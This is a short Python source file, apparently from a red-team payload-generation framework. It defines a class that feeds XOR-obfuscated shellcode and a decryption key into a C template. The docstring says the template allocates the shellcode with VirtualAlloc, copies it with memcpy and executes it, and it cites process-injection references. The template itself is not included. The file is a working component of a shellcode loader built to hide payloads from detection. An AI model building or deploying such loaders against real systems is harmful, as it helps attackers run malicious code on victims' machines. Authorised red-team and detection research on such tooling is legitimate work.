from .base import CLangBase


class VACPExecXOR(CLangBase):
    """
    Uses VirtualAlloc + memcpy to allocate shellcode after XOR'ing then executes
        https://ired.team/offensive-security/code-injection-process-injection/process-injection
        + https://github.com/Arno0x/ShellcodeWrapper/blob/master/templates/encryptedShellcodeWrapper.cpp
    """

    def __init__(self, shellcode: str, key: str):
        super().__init__()
        self.name = "va_cp_exec_xor"

        self.shellcode = shellcode
        self.key = key

    @property
    def invocation(self):
        return "vacpex();"

    @property
    def method(self):
        return self.template.render(shellcode=self.shellcode, key=self.key)
